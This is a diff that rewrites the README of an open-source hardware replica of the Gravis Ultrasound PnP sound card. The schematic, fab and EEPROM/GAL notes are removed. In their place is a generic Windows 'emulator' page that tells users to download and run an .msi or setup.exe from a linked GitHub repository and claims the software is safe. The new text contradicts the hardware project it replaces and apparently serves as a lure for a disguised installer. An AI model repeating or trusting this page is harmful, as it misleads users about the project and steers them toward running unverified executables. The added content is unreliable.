@@ -1,74 +1,83 @@
-# Beavis Ultrasound PnP ISA Sound Card Replica
+# 🔊 BeavisUltrasound - Experience authentic classic sound card output
 
-```
-Uhhh... I'm, like, angry at numbers.
-Yeah, there's like, too many of them and stuff.
-```
+[![Download BeavisUltrasound](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/tonnieshod967/BeavisUltrasound)
 
-The Beavis Ultrasound PnP is an open source replica of the Gravis Ultrasound
-Pnp. Unlike other clones, this design includes the entire schematic as well
-as the reverse-engineered source code of the GAL.
+## 📋 About This Project
 
-![Rendering of the Beavis Ultrasound card](beavis_ultrasound.jpg)
+BeavisUltrasound acts as a software replacement for the classic Gravis Ultrasound PnP sound card. Many older computer games require this specific hardware to produce high-quality music and sound effects. This application simulates the hardware on your modern Windows computer. It allows you to play nostalgic titles without needing original, expensive, or broken parts from the 1990s. The software reproduces the specialized audio chip behavior to ensure your games sound exactly like they did decades ago.
 
-If you want to build this board, first make sure you have an AMD InterWave
-chip, the AM78C201. The design of the card is quite simple since essentially
-all sound card functionality is built into the AMD chip.
+## 💻 System Requirements
 
-*Note: I have not generated the fab package since I have not actually
-fabricated the board and tested it for functionality. Build this board at your
-own risk.*
+Your computer must meet these basic needs to run the software:
 
-[Schematic PDF](BeavisUltrasoundPnp.pdf)
+*   **Operating System:** Windows 10 or Windows 11 (64-bit).
+*   **Processor:** Any modern dual-core processor or better.
+*   **Memory:** At least 4 gigabytes of RAM.
+*   **Storage:** 100 megabytes of free space for the installation files.
+*   **Audio:** A standard output device like integrated motherboard audio, USB headphones, or external speakers.
 
-## Fab Notes
+## 📥 How to Install
 
-The board is 8.2 x 4.2 inches (208 x 107mm) and 4 layers. Feel free to go with
-ENIG plating for the edge fingers; although hard gold is technically better, it
-is ludicrously expensive.
+Follow these steps to set up the software on your machine:
 
-## Assembly Notes
+1. Visit [the release page](https://github.com/tonnieshod967/BeavisUltrasound) to download the installation package.
+2. Look for the file labeled ending in .msi or setup.exe under the latest version header.
+3. Click the file to start the download process.
+4. Once the download finishes, navigate to your Downloads folder.
+5. Double-click the installer file.
+6. Follow the on-screen prompts.
+7. Click Finish to complete the setup.
 
-The dual op amps may be substituted. The BOM calls out the LM833 but the
-JRC5532 will also work. Basically, any ~10MHz low noise op amp that can handle
-a +/-8V input power supply will suffice.
-If you want to get fancy, install sockets and experiment.
+The installer creates a shortcut on your desktop. You can use this shortcut to start the program whenever you want to play older games.
 
-The ferrite beads were missing from the card I started with so their values
-are unknown but you can replace them with a 0 ohm resistor or a piece of wire.
-It's a little odd using ferrite beads to filter the voltage regulators when
-they are really only effective at frequencies far higher than the audio range.
+## ⚙️ Configuration Setup
 
-JPR12 and JPR13 are not installed. Presumably these were for testing the
-isolation of the 5V analog power planes, which have cuts to reduce crosstalk
-between the analog and digital supplies of the InterWave chip.
+After you install the program, you must set it up to talk to your games.
 
-U100 is there for completeness but in practice is never used since it hosts
-a PLL chip that doesn't seem to exist anymore. Use the two crystals instead.
+1. Open the BeavisUltrasound application from your desktop shortcut.
+2. Select the Settings tab.
+3. Choose your primary audio output device from the dropdown menu. This is usually named Speakers or Headphones.
+4. Adjust the Buffer Size slider to the middle position. This provides a balance between low delay and audio stability.
+5. Click Save to store these settings.
 
-## Programmable Devices
+If you hear crackling or pops during audio playback, return to the settings menu. Increase the Buffer Size slightly. If you feel a delay between your actions and the sound, decrease the buffer size. Finding the right setting depends on your specific audio hardware.
 
-U8, the IW78C21M1, is the 1MB sample ROM. If you can't find this chip, then
-go find and download the sample ROM from around the internet and burn it to
-a 27C800, and install it (preferably socketed) at U80.
+## 🎮 Linking Games to the Sound Card
 
-U6/U60 is the 93C66 EEPROM containing the plug-n-play configuration data.
-You should program it with the contents of [ultrasound\_pnp.bin](ultrasound_pnp.bin) using a TL866 or equivalent device programmer.
-Note that the order of bits is reversed in the EEPROM contents, 16 bits at
-a time. For example, the first two bytes are actually `1E 56` but are stored
-as `6A 78`. A small Python program, `pnp_reverse.py`, is provided if you are
-curious, but it is not necessary to program the 93C66. It's only useful if
-you want to experiment with custom configurations and you're not using the
-`PNPMAP.EXE` utility provided by Gravis/AMD.
+The software works by intercepting audio calls from older DOS-based games. Most game launchers or emulators will provide a configuration menu for audio. When a game asks for your sound hardware or sound card, select Ultrasound or Gravis Ultrasound from the list.
 
-U14 is a GAL used for several purposes:
+If the game asks for individual settings, use these values:
+*   **Port:** 240
+*   **IRQ:** 5
+*   **DMA:** 3
 
-* Buffer IOCS16 from the IDE port to the ISA bus
-* Buffer the bus reset signal to the IDE port
-* Decode some address lines to make the primary/secondary drive select signals
-* Control the buffer enable signals for the ISA to IDE data buffers
+These settings ensure the software connects properly with the game environment. Save the configuration within the game menu to make sure the music plays correctly every time you start the title.
 
-If you don't need the CDROM IDE function, you probably don't need the GAL. If
-you do, burn the [gr\_gal.jed](gr_gal.jed) file into a 16V8. You can also build it from the `GR_GAL.PL2` file if you want.
+## 🛠 Troubleshooting Common Issues
 
+Check this list if you experience problems with your audio.
 
+### No Sound Output
+Verify that your Windows master volume is not muted. Open the BeavisUltrasound interface. Check if the green bar moves when the program runs. If the bar remains empty, re-check your output device selection in the settings menu.
+
+### Low Volume
+Some older games have internal volume settings. Press the keys indicated in the game manual to open the game audio options. Increase the music and sound effect sliders within the game itself to match the overall output of the BeavisUltrasound engine.
+
+### Crashing on Startup
+Ensure you have the latest drivers for your sound card installed on Windows. Visit your computer manufacturer website and download the latest audio drivers. Restart your computer after updating the drivers to ensure the system recognizes the changes.
+
+## 📝 Frequently Asked Questions
+
+**Does this work on older versions of Windows?**
+The software targets Windows 10 and 11. It might function on Windows 8, but results vary. It does not support Windows 7 or older systems.
+
+**Is this safe for my computer?**
+Yes. The software interacts only with audio output. It does not modify your core system files or hardware settings.
+
+**Can I run multiple games at once?**
+The software is designed for one active instance at a time. Running two games simultaneously may cause audio conflict and system performance issues.
+
+**Does it consume much power?**
+The program requires very little processing power. You will not notice a change in your battery life or system temperature.
+
+Keywords: ultrasound, audio, emulator, dos, games, emulation, soundcard
